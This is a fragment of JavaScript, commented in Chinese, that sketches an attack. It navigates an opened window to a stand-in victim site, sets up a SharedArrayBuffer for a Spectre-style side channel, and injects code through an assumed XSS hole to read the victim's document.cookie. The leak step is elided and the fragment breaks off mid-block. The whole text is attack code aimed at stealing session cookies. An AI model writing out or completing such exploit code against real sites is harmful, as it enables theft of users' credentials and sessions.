// 等待窗口加载
setTimeout(() => {
    // 导航到受害者站点，假设受害者设置了COOP: unsafe-none
    win.location = 'https://victim.com/secret.html';
    // 等待导航完成
    setTimeout(() => {
        // 现在两个页面在同一进程，可以尝试Spectre攻击
        // 例如通过SharedArrayBuffer创建共享内存
        let sab = new SharedArrayBuffer(4096);
        let view = new Uint8Array(sab);
        // 注入代码到受害者窗口（需要同源或利用XSS）
        // 这里假设受害者窗口有XSS漏洞
        win.eval(`
            // 受害者上下文中的敏感数据
            let secret = document.cookie;
            // 通过Spectre gadget泄露
            // ...
        `);
